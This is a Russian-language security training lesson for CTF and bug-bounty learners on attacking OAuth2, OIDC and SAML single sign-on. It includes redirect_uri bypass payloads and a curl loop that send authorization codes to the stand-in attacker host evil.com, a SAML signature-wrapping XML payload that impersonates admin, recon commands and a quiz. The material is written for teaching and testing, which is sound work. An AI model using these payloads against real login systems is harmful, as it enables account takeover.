---
id: web-oauth-oidc-saml
title: "OAuth2, OIDC и SAML: типовые ошибки"
category: web
parent: web-auth-protocols
difficulty: hard
order: 3
tags: [oauth, oidc, saml, redirect-uri, sso, authorization]
prerequisites: [web-auth-jwt-idor]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как ломают современный SSO: open redirect_uri, утечка кода, confusion, XSW в SAML и подмена subject."
---

Почти весь «вход через Google/Яндекс/корпоративный SSO» построен на **OAuth2** (авторизация доступа), **OIDC** (аутентификация поверх OAuth2) и **SAML** (старый корпоративный XML-стандарт). Эти протоколы сложны, и ошибки в них дают захват аккаунта — от одного клика жертвы. Здесь мы разберём самые распространённые ошибки и то, как их эксплуатируют.

## Теория: OAuth2 / OIDC флоу

Authorization Code flow (упрощённо):

1. Приложение (`client_id`) ведёт пользователя на провайдера:
   `GET /authorize?response_type=code&client_id=APP&redirect_uri=https://app/cb&scope=openid&state=xyz`
2. Пользователь логинится и **соглашается**.
3. Провайдер редиректит обратно: `https://app/cb?code=AUTH_CODE&state=xyz`.
4. Приложение на бэкенде меняет `code` на токены (`/token`, с `client_secret`).
5. Токен/ID-token (JWT) используется для доступа и идентификации.

Критичные элементы: `redirect_uri` (куда вернут код), `state` (защита от CSRF), `code` (одноразовый секрет), `scope`, `client_secret`.

## Теория: топ ошибок OAuth/OIDC

1. **Слабый/открытый `redirect_uri`.** Если провайдер разрешает подстановочные знаки или поддомены, атакующий уводит `code` на свой домен:
   `redirect_uri=https://app.evil.com/cb` или `https://app/cb/../../evil` или `https://app/cb?next=//evil.com`.
2. **Отсутствие проверки `state`** → OAuth CSRF: атакующий привязывает свой аккаунт к сессии жертвы (login CSRF), после чего жертва работает в чужом профиле (или наоборот).
3. **Утечка `code` через Referer** — если `redirect_uri` — страница с внешними ресурсами/аналитикой, `code` попадает в заголовок `Referer` третьей стороны.
4. **Implicit flow** (`response_type=token`) — токен в URL-фрагменте, утекает через историю/расширения; считается устаревшим.
5. **PKCE не используется** для публичных клиентов → перехват `code` возможен.
6. **Account takeover через `email_verified=false`** — провайдер отдаёт непроверенный email, и клиент доверяет ему как личности.
7. **`id_token` alg confusion / нет проверки подписи** — см. `web-auth-jwt-idor`.
8. **Смешение токенов (cross-client / audience confusion)** — токен, выданный для одного клиента, принимается другим сервисом.

## Теория: SAML

SAML передаёт утверждение (assertion) в XML, подписанное IdP, в SP (service provider) через POST/Redirect binding.

Типовые ошибки:

- **XML Signature Wrapping (XSW):** подпись валидна для одного узла, а SP читает другой (вставленный) узел `Assertion` → подмена `NameID` (пользователя).
- **Комментарий в NameID** (`admin<!---->@x`) — расхождение парсеров.
- **Отсутствие проверки подписи** или проверка только целостности, но не подписанта.
- **XXE** в XML-парсере (см. `web-xxe`).
- **Открытый ACS URL / RelayState** — open redirect после SSO.

## Инструменты: декодирование, перехват, tampering

Посмотреть параметры авторизации в браузере: DevTools → Network, фильтр `authorize`/`callback`. Скопировать запрос как cURL.

Декодировать JWT ID-token:

```bash
echo 'eyJ...' | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

Проверить подпись/alg через инструмент (см. `web-auth-jwt-idor`):

```bash
python3 - <<'PY'
import base64, json
t="PASTE_ID_TOKEN"
h,p,_=t.split(".")
print(json.loads(base64.urlsafe_b64decode(h+"==")))
print(json.loads(base64.urlsafe_b64decode(p+"==")))
PY
```

Для SAML — **SAML Raider** (Burp): он умеет разбирать assertion, подменять подпись, делать XSW, удалять подпись.

Для OAuth — **Burp** + ручное изменение `redirect_uri`, `state`, `scope`.

## Разобранный пример: кража кода через redirect_uri

Шаг 1. Заходим на приложение, инициируем логин. Перехватываем `/authorize`:

```
https://idp.target.local/authorize?response_type=code&client_id=app123&
redirect_uri=https://app.target.local/callback&scope=openid&state=abc
```

Шаг 2. Меняем `redirect_uri` на свой домен и смотрим ответ:

```bash
curl -s -i 'https://idp.target.local/authorize?response_type=code&client_id=app123&redirect_uri=https://evil.com/cb&scope=openid&state=abc'
```

Если ответ `302 Location: https://evil.com/cb?code=...` → redirect_uri не валидируется. Значит, можно увести код жертвы.

Шаг 3. Обходим строгий whitelist подстановкой:

```
redirect_uri=https://app.target.local.evil.com/cb
redirect_uri=https://app.target.local/cb/../..//evil.com
redirect_uri=https://app.target.local/cb%2f@evil.com
redirect_uri=https://app.target.local/cb?next=https://evil.com
```

Ищем вариант, где провайдер принимает, а браузер уходит на `evil.com`.

Шаг 4. Если уводим `code`, обмениваем его на токены (у клиента может быть `client_secret` или PKCE, что усложняет, но при утечке кода и отсутствии PKCE — успех). В отчёте докажите утечку кода, не эксплуатируя чужой аккаунт: используйте свой.

## Разобранный пример: OAuth login CSRF (нет state)

Шаг 1. Атакующий инициирует логин на `app.target.local`, но не завершает — получает свой `code`.

Шаг 2. Строит ссылку на callback: `https://app.target.local/callback?code=ATTACKER_CODE`.

Шаг 3. Жертва открывает ссылку. Приложение меняет `code` на токены атакующего и логинит жертву в **аккаунт атакующего**. Теперь действия жертвы (ввод данных, привязка карты) идут в аккаунт атакующего. Это login CSRF — валидная находка.

## Частые ошибки

- **Путать OAuth и OIDC.** OAuth2 — про доступ, OIDC — про личность; «вход через OAuth2 без OIDC» часто самодельный и дырявый.
- **Не проверять `state`.** Без проверки `state` — CSRF на логин.
- **Считать HTTPS достаточным.** Код утекает через Referer, историю, логи даже по HTTPS.
- **Игнорировать `email_verified`.** Доверие непроверенному email = захват аккаунта.
- **Тестировать на чужом аккаунте.** Всегда используйте свои аккаунты и свои приложения-клиенты.
- **Забывать про SAML.** Если видите `SAMLResponse` в POST — это отдельный мир с XSW и подписью.

## Полный разбор: redirect_uri bypass (с выводом)

Проверяем валидацию `redirect_uri` по всем известным обходам. Сначала baseline — легитимный редирект:

```bash
curl -s -i 'https://idp.target.local/authorize?response_type=code&client_id=app123&redirect_uri=https://app.target.local/callback&scope=openid&state=abc' \
  | grep -i '^location:'
# location: https://app.target.local/callback?code=AUTHCODE&state=abc
```

Теперь обходы — смотрим, какой принимается (редирект на чужой хост):

```bash
for r in \
 'https://evil.com/cb' \
 'https://app.target.local.evil.com/cb' \
 'https://app.target.local/cb/../..//evil.com' \
 'https://app.target.local/cb%2f@evil.com' \
 'https://app.target.local/cb?next=https://evil.com' \
 'https://app.target.local/cb#@evil.com' \
 'https://app.target.local@evil.com/cb' \
 'https://app.target.local/cb/../../evil.com'; do
  echo -n "$r -> "
  curl -s -o /dev/null -w '%{redirect_url}\n' \
    "https://idp.target.local/authorize?response_type=code&client_id=app123&redirect_uri=$r&scope=openid&state=abc"
done
# https://evil.com/cb                  -> (принято, редирект на evil) CRITICAL
# https://app.target.local.evil.com/cb -> https://app.target.local.evil.com/cb?code=...
# ... (остальные отброшены с invalid_request)
```

Приём, если валидатор строгий, но есть **open redirect на самом приложении**: ставьте `redirect_uri=https://app.target.local/redirect?to=https://evil.com` — провайдер разрешит (домен свой), а приложение уведёт код на ваш хост.

## SAML XSW: как это выглядит в Burp

Полезная нагрузка — POST `SAMLResponse` (base64 + URL-encode). Декодируем и правим XML в **SAML Raider**:

1. Импортируем сертификат IdP, включаем автоматическую проверку подписи.
2. Ищем `NameID` (наш пользователь). Меняем на `admin`.
3. Если подпись стала невалидной — применяем XSW: копируем подписанный `<Assertion>` и **оборачиваем** его так, чтобы SP валидировал подпись оригинального узла, а читал подменённый:

```xml
<samlp:Response>
  <saml:Assertion ID="evil">           <!-- SP читает ЭТОТ -->
    <saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="orig">           <!-- подпись валидна для ЭТОГО -->
    <ds:Signature>...valid...</ds:Signature>
    <saml:Subject><saml:NameID>user</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

4. Отправляем через Burp Repeater. Успех — вошли как `admin`.

Смежные атаки: удаление `<Signature>` (если SP не проверяет), подмена `Recipient`/`Audience`, comment injection (`admin<!---->@x`), XXE в парсере.

## Reference-таблица: параметры OAuth/OIDC и их злоупотребление

| Параметр | Роль | Атака |
|----------|------|-------|
| `redirect_uri` | куда вернуть код | open/weak redirect → кража кода |
| `state` | CSRF-защита | отсутствие → login CSRF |
| `response_type` | code/token | `token` (implicit) → утечка токена |
| `code_challenge`/`method` | PKCE | отсутствие/`plain` → перехват кода |
| `scope` | права | эскалация scope (если не проверяется) |
| `client_id` | клиент | cross-client confusion |
| `nonce` (OIDC) | привязка id_token | отсутствие → replay id_token |
| `prompt`/`login_hint` | UX | подмена аккаунта |
| `aud`/`azp` (id_token) | аудитория | token confusion между сервисами |
| `email_verified` | доверие email | ATO при `false` |
| `RelayState` (SAML) | возврат | open redirect |

## OIDC: id_token, nonce, at_hash, PKCE downgrade

- **`nonce`:** если клиент не проверяет `nonce` из `id_token`, можно **replay** чужой `id_token` (полученный, например, через Referer-утечку).
- **`at_hash`/`c_hash`:** связывают токен с `access_code`; их отсутствие позволяет подменять код.
- **PKCE downgrade:** если клиент поддерживает PKCE, но провайдер позволяет `code_challenge_method=plain` или вообще без него, перехваченный `code` обменивается без `code_verifier`.
- **alg confusion в `id_token`:** проверьте `none`/RS256→HS256 (см. `web-jwt-advanced`).
- **`iss`/`aud` не проверяются:** токен другого клиента того же провайдера принимается.

Проверка: декодируйте `id_token`, убедитесь, что `aud` = ваш `client_id`, `iss` = ожидаемый, `nonce` совпадает, `exp` валиден.

## Что делать дальше / решение

1. **Перехватить `/authorize`** и все параметры (DevTools/Burp).
2. **Проверить `redirect_uri`** всеми обходами (суффикс/префикс/@/path/redirect-chain).
3. **Проверить `state`** — отсутствие = login CSRF.
4. **Декодировать `id_token`** — `aud`, `iss`, `nonce`, `alg`, `email_verified`.
5. **Проверить PKCE** — downgrade/absence.
6. **SAML:** искать `SAMLResponse`, тестировать XSW/подпись/comment injection.
7. Зафиксировать захват на **своём** аккаунте и оформить PoC.

## OIDC в деталях: discovery, JWKS, userinfo

OIDC-провайдер публикует конфигурацию и ключи — это точки разведки и атаки:

```bash
# конфигурация провайдера
curl -s https://idp.target.local/.well-known/openid-configuration | jq '{issuer,authorization_endpoint,token_endpoint,jwks_uri}'
# ключи подписи id_token
curl -s https://idp.target.local/.well-known/jwks.json | jq '.keys[]|{kid,kty}'
# userinfo (по access_token)
curl -s -H "Authorization: Bearer $AT" https://idp.target.local/userinfo
```

Что проверять:

- **`issuer`** совпадает с `iss` в токене? Если нет — клиент может принимать токены другого провайдера.
- **`jwks_uri`** — оттуда берутся ключи; если клиент доверяет `jku`/`x5u` из токена, см. `web-jwt-advanced`.
- **`userinfo`** — если он отдаёт данные по «чужому» токену, возможна подмена личности.
- **`authorization_endpoint`** — тестируйте `redirect_uri`/`state`/`prompt`.
- **`token_endpoint`** — проверьте, требует ли `client_secret`/PKCE; без них перехваченный `code` обменивается.

Discovery-документ часто раскрывает дополнительные эндпоинты (device flow, revocation, introspection) — каждый стоит проверить отдельно.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что защищает параметр `state` в OAuth2?"
  options:
    - "Шифрует токен"
    - "От CSRF-атаки на логин"
    - "Ускоряет обмен кода"
    - "Проверяет подпись"
  answer: 1
  explanation: "`state` привязывает ответ к исходному запросу пользователя, предотвращая login CSRF."
- question: "Какая ошибка в `redirect_uri` ведёт к краже кода авторизации?"
  options:
    - "Слишком длинный `redirect_uri`"
    - "Разрешены подстановочные знаки/поддомены, позволяющие увести код на домен атакующего"
    - "`redirect_uri` использует HTTPS"
    - "`redirect_uri` совпадает с зарегистрированным"
  answer: 1
  explanation: "Слабая валидация позволяет подменить получателя кода."
- question: "Что такое XML Signature Wrapping (XSW)?"
  options:
    - "Шифрование всего XML"
    - "Подмена читаемого узла assertion при валидной подписи другого узла"
    - "Сжатие XML"
    - "Преобразование XML в JSON"
  answer: 1
  explanation: "SP проверяет подпись одного узла, а данные берёт из другого."
- question: "Чем опасен implicit flow?"
  options:
    - "Токен передаётся в URL-фрагменте и утекает через историю/расширения"
    - "Он медленнее"
    - "Он требует client_secret"
    - "Он не использует HTTPS"
  answer: 0
  explanation: "`response_type=token` кладёт токен в URL, что небезопасно."
- question: "Почему доверие непроверенному email (`email_verified=false`) опасно?"
  options:
    - "Email не валиден синтаксически"
    - "Атакующий может указать чужой email и войти в аккаунт жертвы"
    - "Письма не доходят"
    - "Это замедляет логин"
  answer: 1
  explanation: "Приложение считает email идентификатором, а он не подтверждён."
```

## Где пригодится

- **CTF (Web):** SSO-задачи строятся на redirect_uri, state, alg confusion и XSW.
- **Bug bounty:** open redirect_uri, отсутствие state, утечка кода — частые высокие выплаты.
- **Пентест:** тестирование SSO/OIDC/SAML — обязательный раздел для корпоративных приложений.
- **Работа (AppSec/Dev):** корректная настройка OAuth-клиентов и проверка подписей — базовая гигиена интеграций.
